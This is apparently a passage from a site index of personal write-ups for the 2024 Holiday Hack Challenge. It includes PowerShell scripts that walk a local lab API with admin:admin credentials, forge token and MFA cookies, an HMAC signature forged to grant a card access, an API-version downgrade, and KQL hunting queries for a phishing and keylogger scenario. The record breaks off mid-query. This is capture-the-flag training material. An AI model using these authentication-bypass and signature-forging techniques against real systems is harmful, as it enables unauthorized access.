8cac896f624576d825564bb30c7250eb,REDACTED 8ef6d2e12a58d7ec521a56f25e624b80,REDACTED b4959370a4c484c10a1ecc53b1b56a7d,REDACTED 38bdd7748a70529e9beb04b95c09195d,REDACTED 8d4366f08c013f5c0c587b8508b48b15,REDACTED 67566692ca644ddf9c1344415972fba8,REDACTED 8fbf4152f89b7e309e89b9f7080c7230,REDACTED 936f4db24a290032c954073b3913f444,REDACTED c44d8d6b03dcd4b6bf7cb53db4afdca6,REDACTED cb722d0b55805cd6feffc22a9f68177d,REDACTED 724d494386f8ef9141da991926b14f9b,REDACTED 67c7aef0d5d3e97ad2488babd2f4c749,REDACTED 5f8dd236f862f4507835b0e418907ffc,4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C # [*] SYSTEMLOG # [*] Defence mechanisms activated, REDACTING endpoints, starting with sensitive endpoints # [-] ERROR, memory corruption, not all endpoints have been REDACTED # [*] Verification endpoint still active # [*] http://127.0.0.1:1225/tokens/\u003csha256sum\u003e # [*] Contact system administrator to unlock panic mode # [*] Site functionality at minimum to keep weapons active Task 8 Luckily the defense mechanisms were faulty! There seems to be one api-endpoint that still isn’t redacted! Communicate with that endpoint! $response = Invoke-WebRequest -Uri \"http://127.0.0.1:1225\" -Headers @{ Authorization = \"Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))\" } -UseBasicParsing; $response.Links | Where-Object { $_.href -like \"http://localhost:1225/endpoints/*\" } | ForEach-Object { $pageContent = Invoke-WebRequest -Uri $_.href -Headers @{ Authorization = \"Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))\" } -UseBasicParsing; if (($pageContent.Content -split '\\s+').Count -eq 138) { if ($pageContent.Content -match '(http[^\"]+\\.csv)') { $csvUrl = $matches[1]; $csvContent = Invoke-WebRequest -Uri $csvUrl -Headers @{ Authorization = \"Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))\" } -UseBasicParsing; # Split each line by comma and return the last value (assumed hash) $csvContent.Content -split \"`n\" | Where-Object { $_ -match '\\b[a-fA-F0-9]{64}\\b' } | ForEach-Object { $fields = $_ -split ',' # Split the line by comma $sha256sum = $fields[-1] # Get the last field (SHA256 hash) # Send a web request with the SHA256 hash $url = \"http://127.0.0.1:1225/tokens/$sha256sum\" $response = Invoke-WebRequest -Uri $url -Headers @{ Authorization = \"Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))\" } -Method Get -UseBasicParsing # Output the response or relevant data $response.Content } } break } } Output\n\u003ch1\u003e[!] ERROR: Missing Cookie 'token'\u003c/h1\u003e Task 9 It looks like it requires a cookie token, set the cookie and try again. # Fetch the content from the URL $response = Invoke-WebRequest -Uri \"http://127.0.0.1:1225/token_overview.csv\" -Headers @{ Authorization = \"Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))\" } -UseBasicParsing # Split the content into lines, filter out lines containing 'REDACTED', '#', 'file_MD5hash', or 'Sha256(file_MD5hash)' $filteredContent = $response.Content -split \"`n\" | Where-Object { $_ -notmatch \"REDACTED\" -and $_ -notmatch \"#\" -and $_ -notmatch \"file_MD5hash\" -and $_ -notmatch \"Sha256\\(file_MD5hash\\)\" } # Convert the filtered lines into an object (in-memory CSV structure) $csvData = $filteredContent | ForEach-Object { $fields = $_ -split \",\" # Split each line by commas into an array of fields [PSCustomObject]@{ Column1 = $fields[0] Column2 = $fields[1] } } $sha256Sum = $csvData.Column2 $md5Sum = $csvData.Column1 $response = Invoke-WebRequest -Uri \"http://127.0.0.1:1225/tokens/$sha256Sum\" -Headers @{ Authorization = \"Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))\" Cookie = \"token=$md5Sum\" } -UseBasicParsing $response.Content Alternatively, I also used this - but the challenge text didn’t change, but the output is nevertheless the same:\nInvoke-WebRequest -Uri \"http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C\" -Headers @{ 'Cookie' = \"token=5f8dd236f862f4507835b0e418907ffc\" } -Credential \"admin\" -AllowUnencryptedAuthentication; Output\nStatusCode : 200 StatusDescription : OK Content : \u003ch1\u003eCookie 'mfa_code', use it at \u003ca href='1732382646.3496673'\u003e/mfa_validate/4216B4FAF4391EE4D3E 0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C\u003c/a\u003e\u003c/h1\u003e RawContent : HTTP/1.1 200 OK Server: Werkzeug/3.0.6 Server: Python/3.10.12 Date: Sat, 23 Nov 2024 17:24:06 GMT Connection: close Content-Type: text/html; charset=utf-8 Content-Length: 149 \u003ch1\u003eCookie 'mfa_code', u… Headers : {[Server, System.String[]], [Date, System.String[]], [Connection, System.String[]], [Content-Ty pe, System.String[]]…} Images : {} InputFields : {} Links : {@{outerHTML=\u003ca href='1732382646.3496673'\u003e/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5 D124FE08E227F84D687A7E06C\u003c/a\u003e; tagName=A; href=1732382646.3496673}} RawContentLength : 149 RelationLink : {} Task 10 Sweet we got a MFA token! We might be able to get access to the system. Validate that token at the endpoint! # Fetch the content from the URL $response = Invoke-WebRequest -Uri \"http://127.0.0.1:1225/token_overview.csv\" -Headers @{ Authorization = \"Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))\" } -UseBasicParsing # Split the content into lines, filter out lines containing 'REDACTED', '#', 'file_MD5hash', or 'Sha256(file_MD5hash)' $filteredContent = $response.Content -split \"`n\" | Where-Object { $_ -notmatch \"REDACTED\" -and $_ -notmatch \"#\" -and $_ -notmatch \"file_MD5hash\" -and $_ -notmatch \"Sha256\\(file_MD5hash\\)\" } # Convert the filtered lines into an object (in-memory CSV structure) $csvData = $filteredContent | ForEach-Object { $fields = $_ -split \",\" # Split each line by commas into an array of fields [PSCustomObject]@{ Column1 = $fields[0] Column2 = $fields[1] } } $sha256Sum = $csvData.Column2 $md5Sum = $csvData.Column1 $response = Invoke-WebRequest -Uri \"http://127.0.0.1:1225/tokens/$sha256Sum\" -Headers @{ Authorization = \"Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))\" Cookie = \"token=$md5Sum\" } -UseBasicParsing $time_code = [regex]::match($response.Content,\"href='(.+)'\").Groups[1].Value $urlpath = [regex]::match($response.Content,\"'\u003e(.+)\u003c/a\u003e\").Groups[1].Value $response = Invoke-WebRequest -Uri \"http://127.0.0.1:1225$urlpath\" -Headers @{ Authorization = \"Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))\" Cookie = \"mfa_code=$time_code; token=$md5Sum; mfa_token=$time_code\" } -UseBasicParsing $response.Content Output\nQ29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg== Inside the HTML there is a Base64 string, which decodes to:\nCorrect Token supplied, you are granted access to the snow cannon terminal. Here is your personal password for access: SnowLeopard2ReadyForAction Task 11 That looks like base64! Decode it so we can get the final secret! # Fetch the content from the URL $response = Invoke-WebRequest -Uri \"http://127.0.0.1:1225/token_overview.csv\" -Headers @{ Authorization = \"Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))\" } -UseBasicParsing # Split the content into lines, filter out lines containing 'REDACTED', '#', 'file_MD5hash', or 'Sha256(file_MD5hash)' $filteredContent = $response.Content -split \"`n\" | Where-Object { $_ -notmatch \"REDACTED\" -and $_ -notmatch \"#\" -and $_ -notmatch \"file_MD5hash\" -and $_ -notmatch \"Sha256\\(file_MD5hash\\)\" } # Convert the filtered lines into an object (in-memory CSV structure) $csvData = $filteredContent | ForEach-Object { $fields = $_ -split \",\" # Split each line by commas into an array of fields [PSCustomObject]@{ Column1 = $fields[0] Column2 = $fields[1] } } $sha256Sum = $csvData.Column2 $md5Sum = $csvData.Column1 $response = Invoke-WebRequest -Uri \"http://127.0.0.1:1225/tokens/$sha256Sum\" -Headers @{ Authorization = \"Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))\" Cookie = \"token=$md5Sum\" } -UseBasicParsing $time_code = [regex]::match($response.Content,\"href='(.+)'\").Groups[1].Value $urlpath = [regex]::match($response.Content,\"'\u003e(.+)\u003c/a\u003e\").Groups[1].Value $response = Invoke-WebRequest -Uri \"http://127.0.0.1:1225$urlpath\" -Headers @{ Authorization = \"Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))\" Cookie = \"mfa_code=$time_code; token=$md5Sum; mfa_token=$time_code\" } -UseBasicParsing [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String([regex]::match($response.Content,\"\u003cp\u003e(.+)\u003c/p\u003e\").Groups[1].Value)) Output 1\nCorrect Token supplied, you are granted access to the snow cannon terminal. Here is your personal password for access: SnowLeopard2ReadyForAction Final Hurray! You have thwarted their defenses! Alabaster can now access their weaponry and put a stop to it. Once HHC grants your achievement, you can close this terminal.",
    "description": "Silver Task 1 There is a file in the current directory called ‘welcome.txt’. Read the contents of this file Get-Content -Path \".\\welcome.txt\" Output\nSystem Overview The Elf Weaponry Multi-Factor Authentication (MFA) system safeguards access to a classified armory containing elf weapons. This high-security system is equipped with advanced defense mechanisms, including canaries, retinal scanner and keystroke analyzing, to prevent unauthorized access. In the event of suspicious activity, the system automatically initiates a lockdown, restricting all access until manual override by authorized personnel.",
    "tags": [],
    "title": "Powershell",
    "uri": "/act2/powershell/index.html"
  },
  {
    "breadcrumb": "HHC 2024 \u003e Act1",
    "content": "Objective (main) Ready your tools and sharpen your wits—only the cleverest can untangle the wires and unlock Santa’s hidden secrets!\nHardware Hacking 101 Part 1 Objective Jingle all the wires and connect to Santa’s Little Helper to reveal the merry secrets locked in his chest!\nSolution for silver In the hint section I found this helpful hint:\nOn the Cutting Edge From: Morcel Nougat Terminal: Hardware Part 1 Hey, I just caught wind of this neat way to piece back shredded paper! It’s a fancy heuristic detection technique—sharp as an elf’s wit, I tell ya! Got a sample Python script right here, courtesy of Arnydo. Check it out when you have a sec: heuristic_edge_detection.py.\"\nI downloaded the script:\nimport os import numpy as np from PIL import Image def load_images(folder): images = [] filenames = sorted(os.listdir(folder)) for filename in filenames: if filename.endswith('.png') or filename.endswith('.jpg'): img = Image.open(os.path.join(folder, filename)).convert('RGB') images.append(np.array(img)) return images def calculate_difference(slice1, slice2): # Calculate the sum of squared differences between the right edge of slice1 and the left edge of slice2 return np.sum((slice1[:, -1] - slice2[:, 0]) ** 2) def find_best_match(slices): n = len(slices) matched_slices = [slices[0]] slices.pop(0) while slices: last_slice = matched_slices[-1] differences = [calculate_difference(last_slice, s) for s in slices] best_match_index = np.argmin(differences) matched_slices.append(slices.pop(best_match_index)) return matched_slices def save_image(images, output_path): heights, widths, _ = zip(*(i.shape for i in images)) total_width = sum(widths) max_height = max(heights) new_image = Image.new('RGB', (total_width, max_height)) x_offset = 0 for img in images: pil_img = Image.fromarray(img) new_image.paste(pil_img, (x_offset, 0)) x_offset += pil_img.width new_image.save(output_path) def main(): input_folder = \"/mnt/c/Users/Roger Johnsen/Downloads/HHC2024/shreds/slices\" output_path = \"/mnt/c/Users/Roger Johnsen/Downloads/HHC2024/assembled_image.png\" slices = load_images(input_folder) matched_slices = find_best_match(slices) save_image(matched_slices, output_path) if __name__ == '__main__': main() I only changed the “input_folder” and “output_path” variables and ran the script. Once finished, it assembled the pieced into this image:\nImage isn’t particularly easy to read. Thus some manual work needs to be done:\nImage assembled are mirrored. In order to mirror it readable, I used this site which offers basic image editing tools: https://www.resizepixel.com/ After mirroring the image, I used https://www.photopea.com/ to rearrange the elements in the picture, making the whole lot readable: Opening the task itself, we are presented a book:\nAnd by closing the book we are presented with a nifty play area:\nConnecting the wires game! The way I solved was to\nPower up the controller (upper right corner) Enter the values from the shredded note (see controllers screen) Conenct USB from controller to UART bridge. Connecting the wires completely willy-nillingly from UART bridge. Selecting a port on the controller. Hit “S” button on the controller to see if it worked. Well. That was the general recipe. In real life, though, I had forgotten to flip the 5V switch over to 3V - so things got a bit toasty here and there. And I also had to cycle the com ports before eventually landing on using USB0.\nAnd by this silver was won!\nSolution for gold For going for gold, I first found the Iframe source:\nThen ran that URL through BurpSuite Browser, where I found a reference to V1 of the API. This hint was located in “main.js” script file.\nHaving captured the post request to solve the game using V2 of the API (basically the same as the GUI game), I just changed the text to refer to V1 of the API:\nDone.\nHardware Hacking 101 Part 2 Santa’s gone missing, and the only way to track him is by accessing the Wish List in his chest—modify the access_cards database to gain entry!\nSolution for Silver Jewel Loggins also gives the following tips:\nFantastic! You managed to connect to the UART interface—great work with those tricky wires! I couldn’t figure it out myself…\nRumor has it you might be able to bypass the hardware altogether for the gold medal. Why not see if you can find that shortcut?\nNext, we need to access the terminal and modify the access database. We’re looking to grant access to card number 42.\nStart by using the slh application—that’s the key to getting into the access database. Problem is, the ‘slh’ tool is password-protected, so we need to find it first.\nSearch the terminal thoroughly; passwords sometimes get left out in the open.\nOnce you’ve found it, modify the entry for card number 42 to grant access. Sounds simple, right? Let’s get to it!\nOpening the terminal, selecting option 1 (“Startup system …”):\nTaking a look around the folder I am currently in, I find a SQLite database:\nTaking a look at the bash history, I found a password (in a command string):\nThe command string is:\nslh --passcode CandyCaneCrunch77 --set-access 1 --id 143 To solve this I consulted the help section using the command slh --help, which then made me better understand how to use it:\nSolution for Gold Jewel Loggins gives following hint regarding the Gold solution:\nThere’s a tougher route if you’re up for the challenge to earn the Gold medal. It involves directly modifying the database and generating your own HMAC signature.\nWe already know the location and name of the SQLite database, so let’s connect:\nsqlite3 access_cards .tables select * from config; select * from access_cards where id = 42; PRAGMA table_info([access_cards]); From the content of table of “config” and “access_cards”, we’ll be using the following information to craft our HMAC signature:\nWhat Value Comment hmac_secret 9ed1515819dec61fd361d5fdabb57f41ecce1a5fe1fe263b98c0d6943b9b232e hmac_message_format {access}{uuid} UUID c06018b6-5e80-4395-ab71-ae5124560189 From table “access_cards” where ID is 42 In order for this to work, we have to use the following formula for input into the HMAC function in Cyberchef:\naccess_levelUUID = 1 + c06018b6-5e80-4395-ab71-ae5124560189\t== 1c06018b6-5e80-4395-ab71-ae5124560189\tThus, concatening the access_level and UUDI without an delimiter. Then we can apply it like so in Cyberchef:\nIt took me forever to figure out that HMAC function was set up using Hex for key, which gave me the wrong output. Switched to UTF-8 as key format and that gave me the correct results. I then could run the following SQL update statement:\nupdate access_cards set sig=\"135a32d5026c5628b1753e6c67015c0f04e26051ef7391c2552de2816b1b7096\", access=1 where id = 42; And Bob’s your uncle! :)",
    "description": "Objective (main) Ready your tools and sharpen your wits—only the cleverest can untangle the wires and unlock Santa’s hidden secrets!\nHardware Hacking 101 Part 1 Objective Jingle all the wires and connect to Santa’s Little Helper to reveal the merry secrets locked in his chest!\nSolution for silver In the hint section I found this helpful hint:\nOn the Cutting Edge From: Morcel Nougat Terminal: Hardware Part 1 Hey, I just caught wind of this neat way to piece back shredded paper!",
    "tags": [],
    "title": "Hardware Hacking 101",
    "uri": "/act1/hardware-hacking/index.html"
  },
  {
    "breadcrumb": "HHC 2024 \u003e Prologue",
    "content": "Objective Assist Poinsettia McMittens with playing a game of Elf Minder 9000.\nSolution pr. level. Sandy Start Waves and crates Tidal Treasures Dune Dash In order to solve this, we must turn the trajectory path for the elf once he has gone back into the tunnel, so that on the return he’ll hook up to the path leading to the goal flag.\nCoral Cove Shell Seekers Palm Gove Shuffle Once the elf has gone through the tunnel, we change the trajectory path so upon return the elf will head for the spring instead.\nTropical Tangle For this level we must change trajectory two times in order to traverse into the goal flag.\nCrate Caper In this level we must change the trajectory multiple times. The elf has to be routed to the goal flag and back using multiple routes in order to collect the crates.\nShoreline Shuffle Yet again, this level consists of multiple trajectory path changes in order to collec the crates\nBeach Bounty Driftwood Dunes This was pretty straight forward, no change of trajectory neeeded\nA real pickle Stumbled on this part in the HTML source code, apparently it is an editor:\nRemoved the “hidden” stylesheet tag to make it visible:\nClicked the “Clear Entities” button, and placed a tunnel at the goal flag:\nThen clicked restart:\nhttps://hhc24-elfminder.holidayhackchallenge.com/game2.js\nif (isEditor) { adminControls.classList.remove('hidden'); console.log('⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡'); console.log('⚡ Hey, I noticed you are in edit mode! Awesome!'); console.log('⚡ Use the tools to create your own level.'); console.log('⚡ Level data is saved to a variable called `game.entities`.'); console.log('⚡ I\\'d love to check out your level--'); console.log('⚡ Email `JSON.stringify(game.entities)` to evan@counterhack.com'); console.log('⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡'); } Mapping Movement Y-axis Position Value Content game.entities[0][1] 1 First dot from upper right corner game.entities[0][1] 10 Last dot from upper right corner, max. 10 X-axis Position Value Content game.entities[0][0] 1 First dot from upper left side game.entities[0][0] 10 Last dot from upper left side, max. 12 Entities Entity Value Entity Type game.entities[0][2] 0 Start game.entities[0][2] 1 Flag game.entities[0][2] 2 Crate game.entities[0][2] 3 Stone game.entities[0][2] 4 Sleepy Crab game.entities[0][2] 5 Sizzling Sand game.entities[0][2] 6 Tunnel game.entities[0][2] 7 Spring game.entities.forEach((item) =\u003e { // Move start flag if (item[2] == 0) { item[0] = 1; item[1] = 1; } // Move goal flag else if (item[2] == 1) { item[0] = 1; item[1] = 9; } // Move crates else if (item[2] == 2) { item[0] = 1; } // Other things else { item[1] = 12 } }); game.entities.forEach((item) =\u003e { if (item[2] !== 0 \u0026\u0026 item[2] !== 1 \u0026\u0026 item[2] !== 2) { item[1] = 12; } }); enable edit mode: https://hhc24-elfminder.holidayhackchallenge.com/index.html?id=30d23f1c-4d17-4646-8475-f8ed051fbaf2\u0026level=Sandy%20Start\u0026edit=1",
    "description": "Objective Assist Poinsettia McMittens with playing a game of Elf Minder 9000.\nSolution pr. level. Sandy Start Waves and crates Tidal Treasures Dune Dash In order to solve this, we must turn the trajectory path for the elf once he has gone back into the tunnel, so that on the return he’ll hook up to the path leading to the goal flag.\nCoral Cove Shell Seekers Palm Gove Shuffle Once the elf has gone through the tunnel, we change the trajectory path so upon return the elf will head for the spring instead.",
    "tags": [],
    "title": "Elf Minder 9000",
    "uri": "/prologue/elf-minder-9000/index.html"
  },
  {
    "breadcrumb": "HHC 2024 \u003e Act2",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Snowball Showdown",
    "uri": "/act2/snowball-showdown/index.html"
  },
  {
    "breadcrumb": "HHC 2024",
    "content": "This is a new chapter.",
    "description": "This is a new chapter.",
    "tags": [],
    "title": "Act3",
    "uri": "/act3/index.html"
  },
  {
    "breadcrumb": "HHC 2024 \u003e Act2",
    "content": "Welcome to your mission to solve the The Great Elf Conflict! To do so, you’ll need to harness the power of KQL (Kusto Query Language) to navigate through the data and uncover crucial evidence.\nYour next step is to meet with Eve Snowshoes, Cyber Engineer, at the at the North Pole Cyber Defense Unit. Eve is known for unmatched expertise in KQL and has been eagerly awaiting your arrival. Alt text\nEve greets you with a nod and gestures toward the terminal. “KQL is like a key, unlocking the hidden secrets buried within the data.”\nSection 1: KQL 101 Question 2 The first command Eve Snowshoes teaches you is one of the most useful in querying data with KQL. It helps you peek inside each table, which is critical for understanding the structure and the kind of information you’re dealing with. By knowing what’s in each table, you’ll be able to create more precise queries and uncover exactly what you need.\nEmployees | take 10 Eve has shared the first table with you. Now, run a take 10 on all the other tables to see what they contain.\nYou can find the tables you have access to at the top of the ADX query window.\nOnce you’ve examined all the tables, type when in doubt take 10 to proceed.\nTables available Table Name Description AuthenticationEvents Records successful and failed logins to devices on the company network. This includes logins to the company’s mail server. Email Records emails sent and received by employees. Employees Contains information about the company’s employees. FileCreationEvents Records files stored on employee’s devices. InboundNetworkEvent Records inbound network events including browsing activity from the Internet to devices within the company network. OutboundNetworkEvents Records outbound network events including browsing activity from within the company network out to the Internet. PassiveDns (External) Records IP-domain resolutions. ProcessEvents Records processes created on employee’s devices. SecurityAlerts Records security alerts from an employee’s device or the company’s email security system. Question 3 Now, let’s gather more intelligence on the employees. To do this, we can use the count operator to quickly calculate the number of rows in a table. This is helpful for understanding the scale of the data you’re working with.\nEmployees | count How many elves did you find?\nUsed the example query:\nEmployees | count The answer is 90\nQuestion 4 You can use the where operator with the Employees table to locate a specific elf. Here’s a template you can follow:\nEmployees | where \u003cfield\u003e\u003coperator\u003e\u003cvalue\u003e Field: The column you want to filter by (e.g., role). Operator: The condition you’re applying (e.g., == for an exact match). Value: The specific value you’re looking for in the field (e.g., Chief Elf Officer).\nCan you find out the name of the Chief Toy Maker?\nEmployees | where role has \"toy\" Answer: Shinny Upatree\nQuestion 5 Here are some additional operators the North Pole Cyber Defense Unit commonly uses. == : Checks if two values are exactly the same. Case-sensitive. contains : Checks if a string appears anywhere, even as part of a word. Not case-sensitive. has : Checks if a string is a whole word. Not case-sensitive. has_any : Checks if any of the specified words are present. Not case-sensitive. in : Checks if a value matches any item in a list. Case-sensitive. Type operator to continue.\nQuestion 6 We can learn more about an elf by cross-referencing information from other tables. Let’s take a look at Angel Candysalt’s correspondence. First, retrieve her email address from the Employees table, and then use it in a query in the Email table.\nEmail | where recipient == \"\u003cinsert Angel Candysalt’s email address here\u003e\" | count How many emails did Angel Candysalt receive?\nlet EMAIL_LIST = Employees | where name has \"Candysalt\" | project email_addr; Email | where recipient in (EMAIL_LIST) | count Answer: 31.\nQuestion 7 You can use the distinct operator to filter for unique values in a specific column. Here’s a start:\nEmail | where sender has \"\u003cinsert domain name here\u003e\" | distinct \u003cfield you need\u003e | count How many distinct recipients were seen in the email logs from twinkle_frostington@santaworkshopgeeseislands.org?\nEmail | where sender has \"twinkle_frostington@santaworkshopgeeseislands.org\" | distinct recipient | count Answer: 32\nQuestion 8 It’s time to put everything we’ve learned into action!\nOutboundNetworkEvents | where src_ip == \"\u003cinsert IP here\u003e\" | \u003coperator\u003e \u003cfield\u003e | \u003coperator\u003e How many distinct websites did Twinkle Frostington visit?\nlet IPADDR = Employees | where name has \"Twinkle Frostington\" | project ip_addr; OutboundNetworkEvents | where src_ip in (IPADDR) | summarize count() Answer: 4\nQuestion 9 How many distinct domains in the PassiveDns records contain the word green?\nPassiveDns | where \u003cfield\u003e contains “\u003cvalue\u003e” | \u003coperator\u003e \u003cfield\u003e | \u003coperator\u003e You may have notice we’re using contains instead of has here. That’s because has will look for an exact match (the word on its own), while contains will look for the specified sequence of letters, regardless of what comes before or after it. You can try both on your query to see the difference!\nPassiveDns | where domain contains \"green\" | summarize count() Answer: 10\nQuestion 10 Sometimes, you’ll need to investigate multiple elves at once. Typing each one manually or searching for them one by one isn’t practical. That’s where let statements come in handy. A let statement allows you to save values into a variable, which you can then easily access in your query.\nLet’s look at an example. To find the URLs they accessed, we’ll first need their IP addresses. But there are so many Twinkles! So we’ll save the IP addresses in a let statement, like this:\nlet twinkle_ips = Employees | where name has \"\u003cthe name we’re looking for\u003e\" | distinct ip_addr; This saves the result of the query into a variable. Now, you can use that result easily in another query:\nOutboundNetworkEvents | where src_ip in (twinkle_ips) | distinct \u003cfield\u003e How many distinct URLs did elves with the first name Twinkle visit?\nlet twinkle_ips = Employees | where name has \"twinkle\" | distinct ip_addr; OutboundNetworkEvents | where src_ip in (twinkle_ips) | distinct url | summarize count() Answer: 8\nSection 2: Operation Surrender: Alabaster’s Espionage Question 1 Eve Snowshoes approaches with a focused expression. “Welcome to Operation Surrender: Alabaster’s Espionage. In this phase, Team Alabaster has executed a covert operation, and your mission is to unravel their tactics. You’ll need to piece together the clues and analyze the data to understand how they gained an advantage.”\nType surrender to get started!\nQuestion 2 Team Alabaster, with their limited resources, was growing desperate for an edge over Team Wombley. Knowing that a direct attack would be costly and difficult, they turned to espionage. Their plan? A carefully crafted phishing email that appeared harmless but was designed to deceive Team Wombley into downloading a malicious file. The email contained a deceptive message with the keyword “surrender” urging Wombley’s members to click on a link.\nNow, it’s up to you to trace the origins of this operation.\nWho was the sender of the phishing email that set this plan into motion?\nTry checking out the email table using the knowledge you gained in the previous section!\nAnswer:\nEmail | where subject has \"surrender\" | distinct sender Sender is: surrender@northpolemail.com\nQuestion 3 Team Alabaster’s phishing attack wasn’t just aimed at a single target—it was a coordinated assault on all of Team Wombley. Every member received the cleverly disguised email, enticing them to click the malicious link that would compromise their systems.\nHint: the distinct operator would help here Your mission is to determine the full scale of this operation.\nHow many elves from Team Wombley received the phishing email?\nAnswer:\nEmail | where subject has \"surrender\" | distinct recipient | summarize count() Number is: 22\nQuestion 4 The phishing email from Team Alabaster included a link to a file that appeared legitimate to Team Wombley. This document, disguised as an important communication, was part of a carefully orchestrated plan to deceive Wombley’s members into taking the bait.\nTo understand the full extent of this operation, we need to identify the file where the link led to in the email.\nWhat was the filename of the document that Team Alabaster distributed in their phishing email?\nAnswer\nEmail | where subject has \"surrender\" | project document_name=tostring(split(link, '/')[-1]) | distinct document_name Document name is: Team_Wombley_Surrender.doc\nQuestion 5 As the phishing emails landed in the inboxes of Team Wombley, one elf was the first to click the URL, unknowingly triggering the start of Team Alabaster’s plan. By connecting the employees to their network activity, we can trace who fell for the deception first. To find the answer, you’ll need to join two tables: Employees and OutboundNetworkEvents. The goal is to match employees with the outbound network events they initiated by using their IP addresses.\nHere’s an example query to help you:\nEmployees | join kind=inner ( OutboundNetworkEvents ) on $left.ip_addr == $right.src_ip // condition to match rows | where url contains \"\u003c maybe a filename :) \u003e\" | project name, ip_addr, url, timestamp // project returns only the information you select | sort by timestamp asc //sorts time ascending This query will give you a list of employees who clicked on the phishing URL. The first person to click will be at the top of the list!\nWho was the first person from Team Wombley to click the URL in the phishing email?\nAnswer:\nEmployees | join kind=inner ( OutboundNetworkEvents ) on $left.ip_addr == $right.src_ip // condition to match rows | where url contains \"Team_Wombley_Surrender.doc\" | project name, ip_addr, url, timestamp // project returns only the information you select | sort by timestamp asc //sorts time ascending | take 1 The one that clicked the link first was: Joyelle Tinseltoe\nQuestion 6 Once the phishing email was clicked and the malicious document was downloaded, another file was created upon execution of the .doc. This file allowed Team Alabaster to gain further insight into Team Wombley’s operations. To uncover this, you’ll need to investigate the processes that were executed on Joyelle Tinseltoe’s machine.\nYour mission is to determine the name of the file that was created after the .doc was executed.\nFocus on Joyelle Tinseltoe’s hostname and explore the ProcessEvents table. This table tracks which processes were started and by which machines. By filtering for Joyelle’s hostname and looking at the timestamps around the time the file was executed, you should find what you’re looking for. Here’s an example to help guide you:\nProcessEvents | where timestamp between(datetime(\"2024-11-25T09:00:37Z\") .. datetime(\"2024-11-26T17:20:37Z\")) //you’ll need to modify this | where hostname == \"\u003cJoyelle's hostname\u003e\" This query will show processes that ran on Joyelle Tinseltoe’s machine within the given timeframe.\nWhat was the filename that was created after the .doc was downloaded and executed?\nAnswer:\nlet TIMESTART = toscalar(Employees | join kind=inner ( OutboundNetworkEvents ) on $left.ip_addr == $right.src_ip // condition to match rows | where url contains \"Team_Wombley_Surrender.doc\" | project name, ip_addr, url, timestamp // project returns only the information you select | sort by timestamp asc //sorts time ascending | take 1 | project timestamp) ; let HOSTNAME = toscalar(Employees | where name == \"Joyelle Tinseltoe\" | project hostname ); ProcessEvents | where timestamp between(TIMESTART .. TIMESTART+1h) //you’ll need to modify this | where hostname == HOSTNAME | summarize count() by process_name Output:\nprocess_name count_ cmd.exe 1 keylogger.exe 4 Explorer.exe 2 keylogger.exe (since it has the most entries)\nQuestion 7 Well done on piecing together the clues and unraveling the operation!\nTeam Alabaster’s phishing email, sent from surrender@northpolemail.com, targeted 22 elves from Team Wombley. The email contained a malicious document named Team_Wombley_Surrender.doc, which led to the first click by Joyelle Tinseltoe.\nAfter the document was downloaded and executed, a malicious file was created, impacting the entire Team Wombley as it ran on all their machines, giving Team Alabaster access to their keystokes!\nTo obtain your flag use the KQL below with your last answer!\nlet flag = \"Change This!\"; let base64_encoded = base64_encode_tostring(flag); print base64_encoded Solution\nlet TIMESTART = toscalar(Employees | join kind=inner ( OutboundNetworkEvents ) on $left.ip_addr == $right.src_ip // condition to match rows | where url contains \"Team_Wombley_Surrender.doc\" | project name, ip_addr, url, timestamp // project returns only the information you select | sort by timestamp asc //sorts time ascending | take 1 | project timestamp) ; let HOSTNAME = toscalar(Employees | where name == \"Joyelle Tinseltoe\" | project hostname ); let flag = toscalar(ProcessEvents | where timestamp between(TIMESTART .. TIMESTART+1h) //you’ll need to modify this | where hostname == HOSTNAME | summarize count() by process_name | where count_ \u003e= 4 | project process_name ); let base64_encoded = base64_encode_tostring(flag); print base64_encoded a2V5bG9nZ2VyLmV4ZQ==\nQuestion 8 “Fantastic work on completing Section 2!” Eve Snowshoes, Senior Security Analyst, says with a proud smile.\n“You’ve demonstrated sharp investigative skills, uncovering every detail of Team Wombley’s attack on Alabaster. Your ability to navigate the complexities of cyber warfare has been impressive.\nBut now, we embark on Operation Snowfall: Team Wombley’s Ransomware Raid. This time, the difficulty will increase as we dive into more sophisticated attacks. Stay sharp, and let’s see if you can rise to the occasion once again!”\nType snowfall to begin\nSection 3: Operation Snowfall: Team Wombley’s Ransomware Raid Qustion 1 Team Wombley’s assault began with a password spray attack, targeting several accounts within Team Alabaster. This attack relied on repeated login attempts using common passwords, hoping to find weak entry points. The key to uncovering this tactic is identifying the source of the attack. Alt text Authentication events can be found in the AuthenticationEvents table. Look for a pattern of failed login attempts.\nHere’s a query to guide you:\nAuthenticationEvents | where result == \"Failed Login\" | 